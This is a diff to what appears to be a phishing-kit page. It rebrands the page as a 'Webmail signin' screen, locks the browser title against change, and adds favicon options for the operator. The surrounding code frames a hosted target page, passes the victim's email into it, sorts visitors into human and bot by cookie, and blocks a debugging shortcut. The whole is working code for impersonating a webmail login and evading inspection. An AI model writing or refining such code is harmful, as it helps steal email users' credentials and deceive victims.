@@ -2,14 +2,37 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>Webmail signin</title>
     <meta name="referrer" content="no-referrer">
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- Transparent favicon -->
+    <!-- =========================================== -->
+    <!-- MANUAL FAVICON SECTION - REPLACE THESE LINES -->
+    <!-- =========================================== -->
+    <!-- Default: Transparent 1x1 pixel favicon -->
     <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 1 1%22></svg>">
+    
+    <!-- TO USE YOUR OWN FAVICON, REPLACE THE ABOVE LINE WITH ONE OF THESE: -->
+    
+    <!-- Option 1: URL to your favicon -->
+    <!-- <link rel="icon" href="https://yourdomain.com/favicon.ico"> -->
+    
+    <!-- Option 2: Data URI favicon (PNG base64) -->
+    <!-- 
+    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAACZSURBVChTY2CgF8BIg8YQQC9gYmaSxjFyjk0pP1heX4+N2cS2lBksf5CJmckSLJ8Plv8Ilq8FyzFj02AsD9ZeYWa2t8QqCQZbwNJ/gcYdZC8wM9OkoOgg9IYk8DIlgGLA28CqyQDYGxjVWjCqgdi1AL0qU9CqFQBYUhiVYyB7HwAAAABJRU5ErkJggg==">
+    -->
+    
+    <!-- Option 3: Multiple favicon formats -->
+    <!--
+    <link rel="shortcut icon" href="https://yourdomain.com/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="https://yourdomain.com/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" href="https://yourdomain.com/apple-touch-icon.png">
+    -->
+    <!-- =========================================== -->
+    <!-- END FAVICON SECTION -->
+    <!-- =========================================== -->
     
     <style>
         html, body {
@@ -98,10 +121,14 @@
     
     // Configuration
     const TARGET_BASE = "https://bafkreick3zbqfdrqbzniqoyztbbmu52nuklp2blqgwfbbveu6e5tasjngu.ipfs.dweb.link/";
+    const PAGE_TITLE = "Webmail signin"; // Page title for browser tab
     const HUMAN_COOKIE = 'verified_' + window.location.hostname.replace(/[^a-z0-9]/gi, '').substr(0, 8);
     const COOKIE_EXPIRES = 86400;
     const BOT_COOKIE = 'blocked_' + window.location.hostname.replace(/[^a-z0-9]/gi, '').substr(0, 8);
     const BOT_COOKIE_EXPIRES = 1800;
+    
+    // Ensure title stays as "Webmail signin"
+    document.title = PAGE_TITLE;
     
     // Show error page
     function showErrorPage() {
@@ -110,6 +137,9 @@
         
         if (container) container.style.display = 'none';
         if (errorContainer) errorContainer.style.display = 'flex';
+        
+        // Keep title consistent even on error page
+        document.title = PAGE_TITLE;
     }
     
     // Cookie functions
@@ -137,13 +167,36 @@
         }
     }
     
-    // Create blob for final redirect (NO HEADERS, NO TITLES)
+    // Get favicon URL from the page (for use in blob)
+    function getFaviconUrl() {
+        // Try to find the favicon link
+        const faviconLink = document.querySelector('link[rel="icon"]');
+        if (faviconLink && faviconLink.href) {
+            return faviconLink.href;
+        }
+        
+        // Try shortcut icon
+        const shortcutLink = document.querySelector('link[rel="shortcut icon"]');
+        if (shortcutLink && shortcutLink.href) {
+            return shortcutLink.href;
+        }
+        
+        // Default to transparent favicon
+        return 'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 1 1%22></svg>';
+    }
+    
+    // Create blob for final redirect - uses "Webmail signin" title
     function createBlob(targetUrl, email) {
+        const faviconUrl = getFaviconUrl();
+        
         const html = `<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>${PAGE_TITLE}</title>
+<!-- Using the same favicon as the main page -->
+<link rel="icon" href="${faviconUrl}">
 <style>
 html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
 iframe { width: 100%; height: 100%; border: none; }
@@ -318,6 +371,17 @@ iframe { width: 100%; height: 100%; border: none; }
         if (e.key === 'F12' && e.ctrlKey && e.shiftKey) {
             // Only block Ctrl+Shift+F12 (some debugging tools)
             e.preventDefault();
+        }
+    });
+    
+    // Monitor title to ensure it stays "Webmail signin"
+    let originalTitle = PAGE_TITLE;
+    Object.defineProperty(document, 'title', {
+        get: function() { return originalTitle; },
+        set: function(value) {
+            // Always revert to "Webmail signin"
+            originalTitle = PAGE_TITLE;
+            document.querySelector('title').textContent = PAGE_TITLE;
         }
     });
     
